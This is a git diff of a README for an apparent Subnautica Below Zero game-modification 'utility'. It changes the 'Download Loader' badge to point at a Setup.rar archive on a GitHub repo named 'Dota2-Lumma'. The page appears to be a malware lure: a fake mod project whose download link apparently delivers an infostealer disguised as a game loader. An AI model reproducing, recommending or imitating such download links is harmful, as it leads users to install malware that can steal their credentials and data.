@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Subnautica Below Zero Utility
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,6 +38,7 @@ configs/
 `Subnautica-Below-Zero-Utility` · Updated: 2026-10-07
 
 **Tags:** `subnautica-below-zero` `utility` `savegame` `survival` `arctic`
+
 
 
 
